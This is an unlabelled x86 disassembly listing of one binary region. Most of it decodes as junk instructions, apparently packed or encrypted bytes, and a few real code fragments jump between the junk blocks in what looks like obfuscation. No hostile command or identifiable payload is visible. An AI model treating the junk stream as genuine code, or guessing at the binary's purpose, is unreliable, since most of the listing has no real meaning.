  41144f:	cdq    
  411450:	push   DWORD PTR [edx+0x32]
  411453:	adc    ecx,ecx
  411455:	pop    edi
  411456:	mov    edi,0x5dec586
  41145b:	add    edx,DWORD PTR [esi+0x59bcc71c]
  411461:	cdq    
  411462:	push   ax
  411464:	mul    DWORD PTR [edi]
  411466:	enter  0x15b4,0x26
  41146a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41146b:	xor    BYTE PTR [eax-0x76f1806c],bh
  411471:	inc    esi
  411472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411473:	outs   dx,BYTE PTR ds:[esi]
  411474:	pop    ss
  411475:	(bad)  
  411476:	enter  0x7b51,0x21
  41147a:	push   ds
  41147b:	std    
  41147c:	popa   
  41147d:	cdq    
  41147e:	dec    ecx
  41147f:	and    al,0xde
  411481:	test   BYTE PTR [esi+ecx*4+0x64],al
  411485:	mov    ah,0x36
  411487:	out    0x2c,al
  411489:	mov    ecx,0x8e69f5d3
  41148e:	mov    eax,ds:0xeeb80abb
  411493:	aam    0x91
  411495:	mov    BYTE PTR [eax+0x62b2808b],ah
  41149b:	mov    cl,0xfc
  41149d:	repnz xchg ebx,eax
  41149f:	mov    ds:0xe53f75dd,al
  4114a4:	jmp    0x41150e
  4114a6:	icebp  
  4114a7:	fs je  0x4114d0
  4114aa:	lock inc esp
  4114ac:	test   DWORD PTR [ebx],ebx
  4114ae:	out    dx,eax
  4114af:	leave  
  4114b0:	aad    0x76
  4114b2:	jo     0x411445
  4114b4:	jge    0x41152f
  4114b6:	mov    ch,0x3c
  4114b8:	dec    ecx
  4114b9:	das    
  4114ba:	fucomip st,st(4)
  4114bc:	push   edx
  4114bd:	inc    ebp
  4114be:	pop    ss
  4114bf:	dec    ebp
  4114c0:	jne    0x411482
  4114c2:	rcr    bl,0xde
  4114c5:	dec    edi
  4114c6:	or     eax,0x133d536e
  4114cb:	pop    edi
  4114cc:	(bad)  
  4114cd:	cmc    
  4114ce:	adc    ah,BYTE PTR [ebp+0x1a90c932]
  4114d4:	iret   
  4114d5:	jo     0x411516
  4114d7:	in     al,dx
  4114d8:	mov    dh,0x14
  4114da:	mov    ebx,0xb4d92b
  4114df:	mov    ebp,0x7200923
  4114e4:	stos   DWORD PTR es:[edi],eax
  4114e5:	fs hlt 
  4114e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e8:	out    0x9d,al
  4114ea:	xor    bh,BYTE PTR [esi]
  4114ec:	das    
  4114ed:	inc    ebp
  4114ee:	mov    edi,0x66dc876d
  4114f3:	lods   eax,DWORD PTR ds:[esi]
  4114f4:	pop    ebx
  4114f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114f6:	and    al,BYTE PTR [esi+edi*1]
  4114f9:	cmp    al,0xd
  4114fb:	pop    edx
  4114fc:	sti    
  4114fd:	sub    BYTE PTR [esi+ecx*1-0x66],0xf8
  411502:	test   al,0x6e
  411504:	mov    ds:0xaa610924,al
  411509:	jmp    0x187fa889
  41150e:	xor    BYTE PTR [ecx+0x3b],bh
  411511:	dec    ebx
  411512:	faddp  st(4),st
  411514:	jnp    0x41151a
  411516:	test   eax,0x5a634832
  41151b:	into   
  41151c:	lea    ebp,[edx]
  41151e:	cld    
  41151f:	mov    edi,0x57e99945
  411524:	into   
  411525:	ret    0xa2d7
  411528:	sub    BYTE PTR [ebp+0x1d65116d],0x37
  41152f:	imul   edi,DWORD PTR [ecx-0x4b],0x42
  411533:	loop   0x411553
  411535:	daa    
  411536:	push   edx
  411537:	xor    DWORD PTR ds:0xb3861ed8,edi
  41153d:	sbb    BYTE PTR [esi],ah
  41153f:	add    al,0x48
  411541:	addr16 inc esp
  411543:	fdiv   st(4),st
  411545:	jns    0x411578
  411547:	out    dx,al
  411548:	daa    
  411549:	push   eax
  41154a:	jp     0x411573
  41154c:	enter  0x3f40,0x9f
  411550:	add    eax,0xfa66c3a1
  411555:	outs   dx,DWORD PTR ds:[esi]
  411556:	jg     0x41151f
  411558:	pop    esi
  411559:	xlat   BYTE PTR ds:[ebx]
  41155a:	(bad)  [edx-0x8]
  41155d:	sbb    ebx,DWORD PTR [edx-0x69]
  411560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411561:	cdq    
  411562:	std    
  411563:	inc    DWORD PTR [ebp+0xc]
  411566:	jmp    0x4111ca
  41156b:	mov    eax,DWORD PTR [ebp-0x10]
  41156e:	xor    eax,ecx
  411570:	jmp    0x41170c
  411575:	jmp    0xe967:0xb166b574
  41157c:	jo     0x41155e
  41157e:	fidiv  WORD PTR [edx-0x5c]
  411581:	rol    DWORD PTR [eax],0x5f
  411584:	mov    eax,ds:0x7e7e4180
  411589:	icebp  
  41158a:	jg     0x41160a
  41158c:	jle    0x411539
  41158e:	or     ah,bl
  411590:	aad    0x62
  411592:	loop   0x411599
  411594:	jns    0x4115e2
  411596:	xor    cl,0x3d
  411599:	ins    DWORD PTR es:[edi],dx
  41159a:	cmp    BYTE PTR [esp+edx*2-0x55],bh
  41159e:	push   eax
  41159f:	push   edx
  4115a0:	mov    al,ds:0xde0319ce
  4115a5:	mov    al,ds:0x44ab3662
  4115aa:	add    BYTE PTR [esi+0x331fe30f],dh
  4115b0:	adc    al,BYTE PTR [ecx+edi*8]
  4115b3:	adc    DWORD PTR [eax+0x2c],ebp
  4115b6:	mov    cl,0xa0
  4115b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115b9:	stos   BYTE PTR es:[edi],al
  4115ba:	(bad)  
  4115bb:	icebp  
  4115bc:	cmp    ebx,DWORD PTR [ecx-0x1]
  4115bf:	add    al,0xd3
  4115c1:	mov    dh,0x53
  4115c3:	mov    bl,0xd
  4115c5:	sahf   
  4115c6:	ret    0x22c1
  4115c9:	and    BYTE PTR [edi-0x5bf58f30],ah
  4115cf:	dec    eax
  4115d1:	mov    bh,0x16
  4115d3:	mov    al,ds:0xdc67fc0b
  4115d8:	add    al,0xef
  4115da:	shl    ch,1
  4115dc:	and    ebp,DWORD PTR [ecx]
  4115de:	bound  ebx,QWORD PTR [ecx+0x1b]
  4115e1:	pop    esi
  4115e2:	lods   al,BYTE PTR ds:[esi]
  4115e3:	mov    al,0xec
  4115e5:	cmc    
  4115e6:	xchg   ecx,eax
  4115e7:	test   DWORD PTR [ecx],ecx
  4115e9:	mov    WORD PTR [ebp+0x7],?
  4115ec:	retf   
  4115ed:	rcl    dh,0x20
  4115f0:	imul   edx,DWORD PTR [edi],0x2c095dc7
  4115f6:	fs inc edi
  4115f8:	inc    ecx
  4115f9:	xor    al,0xc1
  4115fb:	push   ecx
  4115fc:	inc    ebx
  4115fd:	fs lahf 
  4115ff:	outs   dx,DWORD PTR ds:[esi]
  411600:	daa    
  411601:	adc    esi,0x32e8dda5
  411607:	mov    bl,0x9c
  411609:	scas   eax,DWORD PTR es:[edi]
  41160a:	pop    esp
  41160b:	sbb    esp,esi
  41160d:	repnz mov al,0x19
  411610:	xlat   BYTE PTR ds:[ebx]
  411611:	dec    ecx
  411612:	xchg   edx,eax
  411613:	xchg   ebx,eax
  411614:	dec    ax
  411616:	pushf  
  411617:	cmp    cl,BYTE PTR [ebx+0x55]
  41161a:	dec    edx
  41161b:	aam    0xe2
  41161d:	pushf  
  41161e:	es mov al,0xd
  411621:	popa   
  411622:	push   cs
  411623:	sbb    al,0x9f
  411625:	sub    ecx,DWORD PTR ds:0x42abdc0a
  41162b:	es mov al,0x4
  41162e:	sub    al,BYTE PTR [esi+0x43a79561]
  411634:	sbb    al,0xa3
  411636:	xchg   DWORD PTR [ebp+0x5c],ebp
  411639:	call   0x3e5b95d1
  41163e:	cdq    
  41163f:	jne    0x411615
  411641:	add    eax,DWORD PTR [ebx-0x63]
  411644:	in     eax,0x18
  411646:	cmp    DWORD PTR [eax-0xf3420c0],edx
  41164c:	retf   0x5483
  41164f:	cmp    ebx,eax
  411651:	loope  0x41166d
  411653:	loopne 0x41161d
  411655:	inc    ebp
  411656:	out    dx,eax
  411657:	(bad)  
  411658:	aaa    
  411659:	mov    WORD PTR [eax+eiz*4-0x76],gs
  41165d:	xchg   edx,eax
  41165e:	and    eax,0x432fc25b
  411663:	jmp    0x14d0be6e
  411668:	add    eax,0xf444cadd
  41166d:	jg     0x4116d9
  41166f:	out    dx,al
  411670:	jns    0x41169c
  411672:	pop    edi
  411673:	jecxz  0x411653
  411675:	inc    esi
  411676:	and    eax,0xaee0fe94
  41167b:	xor    eax,0xd2ce99eb
  411680:	test   DWORD PTR [eax+0x18],esp
  411683:	inc    ebx
  411684:	mov    ch,BYTE PTR [ebx+0x7529d864]
  41168a:	dec    ebp
  41168b:	sbb    BYTE PTR [ebp+0x200c773a],cl
  411691:	test   DWORD PTR [ebp-0x6e],esi
  411694:	cmp    eax,0xd88bceda
  411699:	push   0xb58a0c85
  41169e:	ret    0xd4a1
  4116a1:	add    BYTE PTR [eax+ebp*2-0x47],dl
  4116a5:	inc    ebp
  4116a6:	jo     0x4116ee
  4116a8:	inc    edx
  4116a9:	(bad)
  4116ac:	out    dx,al
  4116ad:	loope  0x4116ae
  4116af:	arpl   WORD PTR [eax],cx
  4116b1:	fisttp DWORD PTR ds:[ebp-0x3cc76b2a]
  4116b8:	sub    BYTE PTR [ecx+0x47],bh
  4116bb:	inc    ebx
  4116bc:	cmp    edx,DWORD PTR [eax+0x2e872229]
  4116c2:	inc    edx
  4116c3:	je     0x4116c3
  4116c5:	inc    esi
  4116c6:	int3   
  4116c7:	pusha  
  4116c8:	mov    cl,0xed
  4116ca:	pusha  
  4116cb:	xchg   BYTE PTR [edx+0x1f84b79e],dh
  4116d1:	loop   0x41166d
  4116d3:	mov    bl,cl
  4116d5:	nop
  4116d6:	pop    edi
  4116d7:	arpl   WORD PTR [ebx+0x62],bx
  4116da:	(bad)  [esi+edx*4-0xce6092d]
  4116e1:	jae    0x411694
  4116e3:	mov    BYTE PTR [edi+0x576f8816],al
  4116e9:	mov    ebx,0x85dc8bbf
  4116ee:	sbb    BYTE PTR [edx+0x1],dl
  4116f1:	inc    ecx
  4116f2:	fwait
  4116f3:	call   0x7e8fcd5a
  4116f8:	arpl   WORD PTR [esi],bx
  4116fa:	enter  0x4a61,0x27
  4116fe:	call   eax
  411700:	mov    dl,0xde
  411702:	rol    DWORD PTR [ecx],cl
  411704:	push   eax
  411705:	inc    esp
  411706:	jnp    0x41171a
  411708:	ins    BYTE PTR es:[edi],dx
  411709:	mov    al,ds:0x4d8baa99
  41170e:	adc    BYTE PTR [ebx],al
  411710:	(bad)  
  411711:	mov    DWORD PTR [ecx],eax
  411713:	pop    esi
  411714:	leave  
  411715:	ret    0xc
  411718:	push   ebp
  411719:	mov    ebp,esp
  41171b:	push   ecx
  41171c:	neg    eax
  41171e:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411725:	mov    eax,DWORD PTR [ebp+0x8]
  411728:	adc    DWORD PTR ds:0x4337ab,0x2178
  411732:	mov    al,BYTE PTR [eax]
  411734:	sbb    DWORD PTR ds:0x4337fb,0x4337c3
  41173e:	add    al,0x38
  411740:	xor    al,0x46
  411742:	cmp    al,0xc3
  411744:	mov    DWORD PTR ds:0x433803,0x7813
  41174e:	jne    0x411ea2
  411754:	and    edx,DWORD PTR ds:0x43382b
  41175a:	mov    eax,DWORD PTR [ebp+0x8]
  41175d:	xor    DWORD PTR ds:0x4337bb,0x67d7
  411767:	mov    ecx,DWORD PTR [ebp+0x8]
  41176a:	add    edx,0xbb1
  411770:	jmp    0x4119ab
  411775:	jo     0x4117d4
  411777:	sbb    DWORD PTR [esi],0x7171e291
  41177d:	rol    DWORD PTR [edi],1
  41177f:	push   ebx
  411780:	sbb    eax,0x807d4fda
  411785:	add    ecx,DWORD PTR [edi+0x7e]
  411788:	jle    0x41179a
  41178a:	jl     0x41180a
  41178c:	jle    0x4117a8
  41178e:	xor    esi,DWORD PTR fs:0xca37dcad
  411795:	mov    BYTE PTR [esi],ah
  411797:	cmc    
  411798:	adc    ah,BYTE PTR [ecx-0x5b]
  41179b:	sub    eax,0xa0cd60cd
  4117a0:	jnp    0x4117e3
  4117a2:	dec    ebx
  4117a3:	inc    ebp
  4117a4:	test   BYTE PTR ds:0x97f17b95,ch
  4117aa:	(bad)  
  4117ab:	mov    ch,0xca
  4117ad:	mov    esp,0x92a1eb31
  4117b2:	sbb    edx,DWORD PTR [edx]
  4117b4:	and    ch,dl
  4117b6:	push   cs
  4117b7:	enter  0xf4d4,0xde
  4117bb:	in     eax,0xd0
  4117bd:	jg     0x411745
  4117bf:	sub    esi,DWORD PTR [ebx-0x69]
  4117c2:	mov    ecx,0xf4e78f79
  4117c7:	out    dx,al
  4117c8:	std    
  4117c9:	or     eax,0x1dae998d
  4117ce:	pop    ds
  4117cf:	add    ecx,esp
  4117d1:	outs   dx,BYTE PTR ds:[esi]
  4117d2:	adc    esp,DWORD PTR [edx+eiz*1+0x24]
  4117d6:	push   ss
  4117d7:	and    BYTE PTR [ebx],0x7e
  4117da:	pop    edi
  4117db:	aaa    
  4117dc:	xchg   esp,eax
  4117dd:	cmp    al,0x40
  4117df:	or     dh,ah
  4117e1:	loopne 0x4117ca
  4117e3:	push   ecx
  4117e4:	pop    ss
  4117e5:	lods   al,BYTE PTR ds:[esi]
  4117e6:	das    
  4117e7:	cmp    al,0x65
  4117e9:	inc    esi
  4117ea:	popf   
  4117eb:	mov    eax,0x497ccd3
  4117f0:	nop
  4117f1:	pusha  
  4117f2:	test   DWORD PTR [eax-0x1817f5df],0x1c3156c6
  4117fc:	inc    esi
  4117fd:	xchg   ebx,eax
  4117fe:	pop    edi
  4117ff:	push   ss
  411800:	jo     0x411872
  411802:	xchg   edx,eax
  411803:	push   ds
  411804:	xor    BYTE PTR [ebp-0x56f8f128],cl
  41180a:	mov    WORD PTR [edi+0x4c],gs
  41180d:	adc    bh,BYTE PTR [esi-0x34]
  411810:	cmp    BYTE PTR [ebp-0x6ca62904],bh
  411816:	xchg   ecx,eax
  411817:	push   ds
  411818:	dec    ecx
  411819:	std    
  41181a:	cld    
  41181b:	push   ss
  41181c:	xchg   esi,eax
  41181d:	dec    ecx
  41181e:	repnz xor BYTE PTR [ecx-0xd5b3c69],dh
  411825:	ja     0x41189a
  411827:	lods   eax,DWORD PTR ds:[esi]
  411828:	pop    ss
  411829:	sbb    dl,BYTE PTR [edi+ebx*4+0x4f784289]
  411830:	pop    eax
  411831:	sti    
  411832:	add    DWORD PTR [ecx],ebx
  411834:	push   ecx
  411835:	xchg   BYTE PTR [ebx+0x2b271e7b],dl
  41183b:	es mov dl,0x1b
  41183e:	adc    esp,ecx
  411840:	das    
  411841:	sti    
  411842:	pop    edx
  411843:	jle    0x4118b7
  411845:	add    eax,0x4b783844
  41184a:	jp     0x41188c
  41184c:	jl     0x4117db
  41184e:	aas    
  41184f:	xor    eax,0x76b8c4b8
  411854:	nop
  411855:	call   0xb6fb:0x249b142d
  41185c:	xor    bh,BYTE PTR [eax+0x6c]
  41185f:	pop    ds
  411860:	leave  
  411861:	mov    ch,0xb1
  411864:	or     bl,BYTE PTR [edx-0xf0c05e8]
  41186a:	stos   DWORD PTR es:[edi],eax
  41186b:	mov    ds:0xf322cde5,eax
  411870:	xchg   ebx,eax
  411871:	ret    0xb9b
  411874:	mov    ebx,0x7a0765d
  411879:	sub    BYTE PTR gs:[ecx+eiz*1],al
  41187d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41187e:	inc    ecx
  41187f:	xor    BYTE PTR [ebp+eax*4+0xe5c1ae],al
  411886:	les    ebp,FWORD PTR [edx]
  411888:	fs sbb al,0x50
  41188b:	xor    DWORD PTR [edi],0xc7f3a3e2
  411891:	stos   BYTE PTR es:[edi],al
  411892:	add    DWORD PTR [edi+0x7f],edi
  411895:	sbb    al,BYTE PTR [edx+0x730f21dc]
  41189b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41189c:	fisttp QWORD PTR [edi]
  41189e:	stos   BYTE PTR es:[edi],al
  41189f:	das    
  4118a0:	push   esp
  4118a1:	stos   DWORD PTR es:[edi],eax
  4118a2:	mov    ah,0x2c
  4118a4:	and    BYTE PTR [edi+0x16],cl
  4118a7:	in     eax,dx
  4118a8:	pop    eax
  4118a9:	nop
  4118aa:	dec    eax
  4118ab:	int3   
  4118ac:	(bad)  
  4118ae:	sbb    ebx,eax
  4118b0:	pop    eax
  4118b1:	not    BYTE PTR [ecx]
  4118b3:	imul   ebp,esp,0x78
  4118b6:	jle    0x4118d2
  4118b8:	push   ss
  4118b9:	xchg   DWORD PTR [esi-0x69a0ad52],eax
  4118bf:	sub    al,0x45
  4118c1:	into   
  4118c2:	xor    DWORD PTR [ecx-0x40],ebp
  4118c5:	dec    ebx
  4118c6:	adc    DWORD PTR [ebx-0x416fd4c9],esi
  4118cc:	push   es
  4118cd:	test   cl,bh
  4118cf:	(bad)  
  4118d0:	sub    al,0xaa
  4118d2:	or     eax,0x135650a
  4118d7:	add    al,0xb9
  4118d9:	xor    BYTE PTR [ecx+0x41],dh
  4118dc:	ss mov cl,0x2
  4118df:	out    0x9b,eax
  4118e1:	mov    bl,0xd6
  4118e3:	dec    esp
  4118e4:	sub    eax,0x4f92f817
  4118e9:	push   0xffffffab
  4118eb:	or     edi,DWORD PTR [eax]
  4118ed:	vorps  xmm2,xmm5,XMMWORD PTR [ecx]
  4118f2:	add    al,0x15
  4118f4:	ins    BYTE PTR es:[edi],dx
  4118f5:	mov    esi,DWORD PTR [ebx]
  4118f7:	and    eax,0x35e000f1
  4118fc:	data16 mov cl,0x18
  4118ff:	add    esp,edx
  411901:	cwde   
  411902:	dec    DWORD PTR [ecx+0x8]
  411905:	cmc    
  411906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411907:	sbb    DWORD PTR [edi-0x57e04834],esp
  41190d:	imul   edi,DWORD PTR [ecx+0x1e],0x3f
  411911:	in     eax,dx
  411912:	or     bh,BYTE PTR [ebx+ebx*4+0x13ae20d4]
  411919:	cmp    bh,0xaf
  41191c:	jno    0x4118a8
  41191e:	sahf   
  41191f:	jmp    0x11526dd9
  411924:	dec    esp
  411925:	shl    al,1
  411927:	lea    esp,[ebp+0x3fd816ba]
  41192d:	loopne 0x411994
  41192f:	xor    ebp,DWORD PTR [ebp+ebx*8+0x6d]
  411933:	int3   
  411934:	and    ebx,DWORD PTR [edi]
  411936:	add    edi,DWORD PTR [ebp+0x53e0fa50]
  41193c:	and    eax,0xe5c83bf4
  411941:	ret    0xe5f8
  411944:	mov    ah,BYTE PTR [eax]
  411946:	dec    esi
  411947:	(bad)  
  411948:	cmp    bh,bh
  41194a:	push   ds
  41194b:	je     0x411983
  41194d:	bound  edi,QWORD PTR [edi-0x3b17eb8b]
  411953:	xor    eax,0x493def60
  411958:	jp     0x411940
  41195a:	or     eax,ecx
  41195c:	loope  0x41190c
  41195e:	push   0xffffff99
  411960:	add    al,0x5f
  411962:	push   ds
  411963:	bound  eax,QWORD PTR [ecx]
  411965:	mov    ah,0xc
  411967:	adc    al,0x48
  411969:	mov    dl,0x37
  41196b:	inc    ebx
  41196c:	xlat   BYTE PTR ds:[ebx]
  41196d:	pop    ds
  41196e:	bound  esi,QWORD PTR [ebx+0x3e9930de]
  411974:	repz jno 0x411939
  411977:	div    DWORD PTR ds:0x3e5bd9e5
  41197d:	outs   dx,DWORD PTR ds:[esi]
  41197e:	sub    ebp,0xfffffffc
  411981:	adc    DWORD PTR [ebp-0x2b],edx
  411984:	(bad)  
  411985:	shr    esp,cl
  411987:	seto   BYTE PTR [edx+esi*8]
  41198b:	aas    
  41198c:	lock pusha 
  41198e:	xor    eax,0x6c837c59
  411993:	dec    edi
  411994:	jecxz  0x411999
  411996:	ins    BYTE PTR es:[edi],dx
  411997:	sub    BYTE PTR [ecx-0x757d45c1],ch
  41199d:	inc    esi
  41199e:	jecxz  0x4119cd
  4119a0:	or     al,0x64
  4119a2:	cmp    al,0xf9
  4119a4:	or     edx,eax
  4119a6:	ret    
  4119a7:	jge    0x411964
  4119a9:	les    esp,FWORD PTR [esi+0x3]
  4119ac:	dec    eax
  4119ad:	cmp    al,0x9
  4119af:	sbb    eax,0x433723
  4119b4:	mov    edx,0x7510854
  4119b9:	mov    DWORD PTR [ebp+0x8],ecx
  4119bc:	and    DWORD PTR ds:0x433827,0x0
  4119c6:	jmp    0x4119d6
  4119cb:	mov    eax,ds:0x433827
  4119d0:	inc    eax
  4119d1:	mov    ds:0x433827,eax
  4119d6:	cmp    DWORD PTR ds:0x433827,0x17
  4119dd:	jae    0x4119fe
  4119e3:	cmp    DWORD PTR ds:0x433827,0x27
  4119ea:	jne    0x4119f9
  4119f0:	push   DWORD PTR [ebp-0x10]
  4119f3:	call   DWORD PTR ds:0x4123b8
  4119f9:	jmp    0x4119cb
  4119fe:	mov    eax,DWORD PTR [ebp-0x4]
  411a01:	jmp    0x411c3c
  411a06:	pop    edi
  411a07:	pop    edx
  411a08:	dec    eax
  411a09:	pop    es
  411a0a:	dec    ecx
  411a0b:	xor    eax,0xcba06271
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	aam    0x34
  411a13:	cmp    eax,0x4d252fc0
  411a18:	jle    0x411a98
  411a1a:	adc    BYTE PTR [esi+edi*2+0x7e],bh
  411a1e:	mov    edi,0xfb20e0d6
  411a23:	fst    QWORD PTR [edi]
  411a25:	cmp    DWORD PTR [esi-0x7585cc9a],ebx
  411a2b:	shr    DWORD PTR [ebx-0x1a687528],cl
  411a31:	push   ecx
  411a32:	dec    BYTE PTR [esi]
  411a34:	aas    
  411a35:	and    al,0x70
  411a37:	aam    0x5
  411a39:	rol    BYTE PTR [ecx],cl
  411a3b:	ror    BYTE PTR [ecx],cl
  411a3d:	mov    ds,WORD PTR [ebp+0x20]
  411a40:	dec    edx
  411a41:	shl    ebp,cl
  411a43:	sub    ch,BYTE PTR [esi]
  411a45:	mov    dh,0x54
  411a47:	xor    esp,DWORD PTR [ebx+0x7133b134]
  411a4d:	adc    eax,0x4e
  411a50:	mov    eax,ds:0xd01bcff1
  411a55:	stos   DWORD PTR es:[edi],eax
  411a56:	loope  0x411a45
  411a58:	dec    edx
  411a59:	or     BYTE PTR [eax-0x71cc6779],ch
  411a5f:	lods   al,BYTE PTR ds:[esi]
  411a60:	cmp    al,0xde
  411a62:	pop    eax
  411a63:	jge    0x411a4f
  411a65:	dec    ebx
  411a66:	pop    ecx
  411a67:	fcom   QWORD PTR [ecx-0x41]
  411a6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a6b:	sbb    eax,0x84b88772
  411a70:	push   cs
  411a71:	data16 arpl bx,sp
  411a74:	test   eax,0xfb65e37
  411a79:	jmp    0x6cbd:0xf409027
  411a80:	push   ss
  411a81:	push   ecx
  411a82:	mov    dl,ch
  411a84:	xor    edi,DWORD PTR [ebx-0x7e11aa53]
  411a8a:	test   DWORD PTR [eax+0x6fe9ad9e],0x2374bf19
  411a94:	into   
  411a95:	push   ebx
  411a96:	and    eax,0x39158b1
  411a9b:	mov    eax,0xfe68b1e1
  411aa0:	jno    0x411a40
  411aa2:	(bad)  
  411aa4:	sbb    eax,0x7f2656b2
  411aa9:	sub    BYTE PTR [esi],cl
  411aab:	and    DWORD PTR [esi-0x4c],edx
  411aae:	in     eax,0x4b
  411ab0:	ret    
  411ab1:	xchg   esi,eax
  411ab2:	in     al,dx
  411ab3:	add    BYTE PTR [edx],bl
  411ab5:	inc    edx
  411ab6:	jl     0x411b1a
  411ab8:	fidiv  WORD PTR [ebp+0x11]
  411abb:	imul   ecx,DWORD PTR [edi+0x18],0xffffffd3
  411abf:	outs   dx,BYTE PTR ds:[esi]
  411ac0:	pop    ebx
  411ac1:	repz sti 
  411ac3:	sub    al,0x3d
  411ac5:	imul   edx,ebx,0x8aa05b
  411acb:	fld    QWORD PTR [edi+0x0]
  411ace:	fmul   QWORD PTR [edi]
  411ad0:	jne    0x411a75
  411ad2:	std    
  411ad3:	test   esi,0xb4eae1d4
  411ad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ada:	dec    eax
  411adb:	ins    BYTE PTR es:[edi],dx
  411adc:	inc    esp
  411add:	add    bh,ah
  411adf:	jle    0x411a6f
  411ae1:	xor    BYTE PTR [edi],dh
  411ae3:	retf   0xf8aa
  411ae6:	test   eax,0xf3ad76ba
  411aeb:	or     bh,BYTE PTR [edi+edi*8-0x15bca2db]
  411af2:	test   eax,0x8c73b04d
  411af7:	mov    esp,ds
  411af9:	rcl    ch,1
  411afb:	shl    DWORD PTR [eax],0x72
  411afe:	mov    cl,0xd4
  411b00:	in     eax,0x32
  411b02:	push   ds
  411b03:	adc    al,bh
  411b05:	shl    cl,cl
  411b07:	dec    eax
  411b08:	or     BYTE PTR [eax+eax*8-0x71],ah
  411b0c:	(bad)  
  411b0d:	fwait
  411b0e:	mov    al,0x82
  411b10:	in     al,dx
  411b11:	int    0x9d
  411b13:	or     esi,edx
  411b15:	ret    
  411b16:	repnz shl DWORD PTR [eax+eax*4],cl
  411b1a:	jle    0x411ac2
  411b1c:	repz mov al,ds:0xdd31243b
  411b22:	xor    eax,0x47b54381
  411b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b28:	sub    eax,DWORD PTR [ecx+edi*1]
  411b2b:	div    DWORD PTR [ecx-0x260455b7]
  411b31:	mov    ebx,0x809f1154
  411b36:	sub    ah,BYTE PTR [edi+0x18]
  411b39:	sbb    ebx,esi
  411b3b:	push   es
  411b3c:	or     al,0x68
  411b3e:	xchg   BYTE PTR [ebx+0x59136874],cl
  411b44:	pusha  
  411b45:	rol    DWORD PTR [esi],0xb9
  411b48:	jecxz  0x411b5b
  411b4a:	jl     0x411b9d
  411b4c:	sti    
  411b4d:	mov    ah,0xd9
  411b4f:	stos   BYTE PTR es:[edi],al
  411b50:	rcl    edx,0xd6
  411b53:	ins    DWORD PTR es:[edi],dx
  411b54:	adc    eax,DWORD PTR [ebx+0x3b53bc22]
  411b5a:	out    dx,eax
  411b5b:	out    dx,eax
  411b5c:	jmp    0x3a905285
  411b61:	and    BYTE PTR [esi-0x58],al
  411b64:	js     0x411bae
  411b66:	out    dx,eax
  411b67:	adc    BYTE PTR [ebx+eiz*2],ah
  411b6a:	ins    BYTE PTR es:[edi],dx
  411b6b:	fistp  QWORD PTR [ecx+0x1a02b260]
  411b71:	xor    esi,DWORD PTR [edi-0x1b300320]
  411b77:	cmp    ebp,DWORD PTR [ebx-0x18]
  411b7a:	mov    ebx,0x238a9237
  411b7f:	and    al,0x84
  411b81:	mov    dh,0x36
  411b83:	and    eax,0xb2526000
  411b88:	imul   ecx,DWORD PTR [esi-0x5de17b],0xffffffca
  411b8f:	push   ds
  411b90:	xor    dl,BYTE PTR ds:0xdc589df5
  411b96:	lahf   
  411b97:	push   ebx
  411b98:	addr16 in eax,dx
  411b9a:	push   edx
  411b9b:	mov    dh,0x88
  411b9d:	jmp    0x411bff
  411b9f:	leave  
  411ba0:	out    0x7c,al
  411ba2:	repnz mov WORD PTR [eax-0x3c5b018a],ss
  411ba9:	jnp    0x411b82
  411bab:	arpl   WORD PTR [eax],bx
  411bad:	jg     0x411be3
  411baf:	pop    edi
  411bb0:	inc    ecx
  411bb1:	inc    ebp
  411bb2:	pop    ss
  411bb3:	pushf  
  411bb4:	push   0x1d8619be
  411bb9:	mov    ebp,0x96f74714
  411bbe:	in     al,0xac
  411bc0:	jmp    0xccdabd3b
  411bc5:	adc    ah,BYTE PTR [edx+0xe32932d]
  411bcb:	gs mov ecx,0xc438b253
  411bd1:	adc    ebx,edi
  411bd3:	das    
  411bd4:	fnstcw WORD PTR [edx+0x439dc690]
  411bda:	fidiv  DWORD PTR [edi]
  411bdc:	xchg   cl,ch
  411bde:	adc    eax,0x66b3875
  411be3:	adc    DWORD PTR [esi],0xb03f1647
  411be9:	fcmovbe st,st(6)
  411beb:	in     al,0x2f
  411bed:	sub    al,0x3c
  411bef:	cli    
  411bf0:	pop    edx
  411bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bf2:	scas   al,BYTE PTR es:[edi]
  411bf3:	pop    edi
  411bf4:	lahf   
  411bf5:	jbe    0x411c1b
  411bf7:	xchg   edx,eax
  411bf8:	or     al,0x19
  411bfa:	sahf   
  411bfb:	in     eax,dx
  411bfc:	and    al,dh
  411bfe:	jg     0x411c0f
  411c00:	ja     0x411c0f
  411c02:	ror    DWORD PTR [esi+0x473356d0],0x8e
  411c09:	push   esp
  411c0a:	fstp   QWORD PTR [ebx+edi*1+0x46]
  411c0e:	dec    esi
  411c0f:	out    dx,al
  411c10:	addr16 dec cl
  411c13:	jmp    0x615f0cc5
  411c18:	lds    ebp,FWORD PTR [edi+0x6d2130a8]
  411c1e:	shl    DWORD PTR [eax],cl
  411c20:	bound  ecx,QWORD PTR [edi]
  411c22:	test   BYTE PTR [ecx+0x751219d6],0xd9
  411c29:	repz or BYTE PTR [eax+0xf575b10],al
  411c30:	adc    eax,0xd138f4cf
  411c35:	mov    dl,0x7d
  411c37:	sbb    al,0x49
  411c39:	xlat   BYTE PTR ds:[ebx]
  411c3a:	fisubr DWORD PTR [esi]
  411c3c:	xor    eax,edx
  411c3e:	push   esi
  411c3f:	mov    esi,DWORD PTR [ebp+0x8]
  411c42:	mov    ecx,0x32729b
  411c47:	add    eax,ecx
  411c49:	jmp    0x411e84
  411c4e:	mov    WORD PTR [eax-0x1a6d186e],cs
  411c54:	imul   esi,DWORD PTR [ecx-0x48],0x55dad6c4
  411c5b:	and    eax,DWORD PTR [edi+0x7e4bc7e6]
  411c61:	jle    0x411c73
  411c63:	jl     0x411ce3
